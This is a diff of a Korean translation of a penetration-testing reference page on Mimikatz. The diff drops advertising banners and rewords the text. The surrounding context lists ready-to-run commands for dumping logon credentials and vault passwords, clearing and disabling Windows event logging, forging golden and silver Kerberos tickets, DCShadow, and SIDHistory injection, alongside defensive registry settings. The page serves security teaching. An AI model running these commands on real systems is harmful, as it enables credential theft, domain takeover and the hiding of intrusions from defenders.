@@ -2,21 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**모바일 보안**에 대한 전문성을 심화하세요. 8kSec 아카데미를 통해 iOS 및 Android 보안을 마스터하고 자격증을 취득하세요:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 **이 페이지는 [adsecurity.org](https://adsecurity.org/?page_id=1821)의 내용을 기반으로 합니다**. 추가 정보는 원본을 확인하세요!
 
-## 메모리의 LM 및 평문
+## LM 및 메모리의 평문
 
 Windows 8.1 및 Windows Server 2012 R2 이후로, 자격 증명 도난을 방지하기 위한 중요한 조치가 시행되었습니다:
 
-- **LM 해시 및 평문 비밀번호**는 보안을 강화하기 위해 더 이상 메모리에 저장되지 않습니다. 특정 레지스트리 설정인 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_을 DWORD 값 `0`으로 구성하여 Digest Authentication을 비활성화하고 "평문" 비밀번호가 LSASS에 캐시되지 않도록 해야 합니다.
+- **LM 해시 및 평문 비밀번호**는 보안을 강화하기 위해 더 이상 메모리에 저장되지 않습니다. 특정 레지스트리 설정인 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_을 DWORD 값 `0`으로 설정하여 Digest Authentication을 비활성화해야 하며, 이를 통해 "평문" 비밀번호가 LSASS에 캐시되지 않도록 합니다.
 
-- **LSA 보호**는 무단 메모리 읽기 및 코드 주입으로부터 로컬 보안 권한(LSA) 프로세스를 보호하기 위해 도입되었습니다. 이는 LSASS를 보호된 프로세스로 표시하여 달성됩니다. LSA 보호를 활성화하려면:
+- **LSA 보호**는 로컬 보안 권한(LSA) 프로세스를 무단 메모리 읽기 및 코드 주입으로부터 보호하기 위해 도입되었습니다. 이는 LSASS를 보호된 프로세스로 표시함으로써 이루어집니다. LSA 보호를 활성화하려면:
 1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_에서 레지스트리를 수정하여 `RunAsPPL`을 `dword:00000001`로 설정합니다.
 2. 관리되는 장치에서 이 레지스트리 변경을 시행하는 그룹 정책 개체(GPO)를 구현합니다.
 
@@ -37,7 +31,7 @@ sc start TrustedInstaller
 ```
 ## Mimikatz 옵션
 
-Mimikatz에서 이벤트 로그 변조는 두 가지 주요 작업을 포함합니다: 이벤트 로그 지우기 및 새로운 이벤트 로그 생성을 방지하기 위해 이벤트 서비스를 패치하는 것입니다. 아래는 이러한 작업을 수행하기 위한 명령어입니다:
+Mimikatz에서 이벤트 로그 변조는 두 가지 주요 작업을 포함합니다: 이벤트 로그 지우기 및 새로운 이벤트 로깅을 방지하기 위해 이벤트 서비스를 패치하는 것입니다. 아래는 이러한 작업을 수행하기 위한 명령어입니다:
 
 #### 이벤트 로그 지우기
 
@@ -47,7 +41,7 @@ Mimikatz에서 이벤트 로그 변조는 두 가지 주요 작업을 포함합�
 #### 실험적 기능: 이벤트 서비스 패치
 
 - **명령어**: `event::drop`
-- 이 실험적 명령어는 이벤트 로깅 서비스의 동작을 수정하여 새로운 이벤트 기록을 효과적으로 방지하도록 설계되었습니다.
+- 이 실험적 명령어는 이벤트 로깅 서비스의 동작을 수정하여 새로운 이벤트를 기록하지 않도록 설계되었습니다.
 - 예시: `mimikatz "privilege::debug" "event::drop" exit`
 
 - `privilege::debug` 명령어는 Mimikatz가 시스템 서비스를 수정하는 데 필요한 권한으로 작동하도록 보장합니다.
@@ -74,7 +68,7 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 ```
 ### Silver Ticket Creation
 
-Silver Tickets는 특정 서비스에 대한 접근을 허용합니다. 주요 명령 및 매개변수:
+Silver Tickets는 특정 서비스에 대한 접근을 허용합니다. 주요 명령어 및 매개변수:
 
 - Command: Golden Ticket과 유사하지만 특정 서비스를 대상으로 합니다.
 - Parameters:
@@ -117,14 +111,14 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - 다른 세션에서 Kerberos 티켓을 사용할 수 있게 합니다.
 - 예: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **티켓 정리**:
+- **티켓 삭제**:
 - 명령어: `kerberos::purge`
 - 세션의 모든 Kerberos 티켓을 지웁니다.
 - 충돌을 피하기 위해 티켓 조작 명령어를 사용하기 전에 유용합니다.
 
 ### Active Directory 변조
 
-- **DCShadow**: AD 객체 조작을 위해 기계를 DC처럼 임시로 작동하게 합니다.
+- **DCShadow**: AD 객체 조작을 위해 기계를 DC처럼 일시적으로 작동하게 합니다.
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
@@ -139,7 +133,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **LSADUMP::NetSync**: 컴퓨터 계정의 비밀번호 데이터를 사용하여 DC를 가장합니다.
 
-- _원본 맥락에서 NetSync에 대한 특정 명령어가 제공되지 않음._
+- _원본 맥락에서 NetSync에 대한 특정 명령어가 제공되지 않았습니다._
 
 - **LSADUMP::SAM**: 로컬 SAM 데이터베이스에 접근합니다.
 
@@ -170,7 +164,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: 디버그 권한을 얻습니다.
 - `mimikatz "privilege::debug" exit`
 
-### 자격 증명 덤핑
+### 자격 증명 덤프
 
 - **SEKURLSA::LogonPasswords**: 로그인한 사용자의 자격 증명을 표시합니다.
 
@@ -184,7 +178,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SID::add/modify**: SID 및 SIDHistory를 변경합니다.
 
 - 추가: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- 수정: _원본 맥락에서 수정에 대한 특정 명령어가 제공되지 않음._
+- 수정: _원본 맥락에서 수정에 대한 특정 명령어가 제공되지 않았습니다._
 
 - **TOKEN::Elevate**: 토큰을 가장합니다.
 - `mimikatz "token::elevate /domainadmin" exit`
@@ -196,17 +190,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: TS/RDP 세션을 나열합니다.
-- _원본 맥락에서 TS::Sessions에 대한 특정 명령어가 제공되지 않음._
+- _원본 맥락에서 TS::Sessions에 대한 특정 명령어가 제공되지 않았습니다._
 
 ### 금고
 
-- Windows Vault에서 비밀번호를 추출합니다.
+- Windows 금고에서 비밀번호를 추출합니다.
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**모바일 보안**에 대한 전문성을 심화하세요. 8kSec 아카데미에서 iOS 및 Android 보안을 마스터하고 자격증을 취득하세요:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
